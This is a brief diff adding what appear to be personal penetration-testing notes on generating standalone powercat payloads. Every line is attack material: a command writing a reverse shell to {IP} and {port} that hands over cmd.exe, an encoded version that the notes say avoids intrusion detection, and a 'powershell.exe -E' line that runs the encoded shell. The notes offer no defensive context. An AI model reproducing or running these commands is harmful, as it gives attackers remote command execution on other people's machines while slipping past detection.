@@ -1,0 +1,9 @@
+generating standalone payloads
+powercat -c {IP} -p {port} -e cmd.exe -g > reverseshell.ps1
+.\reverseshell.ps1
+Might be detected by IDS, we can encode this shells by encoding it.
+powercat -c {IP} -p {PORT} -e {cmd.exe} -ge > encodedreverseshell.ps1
+
+powershell.exe -E {ENCODEDSHELL}
+
+
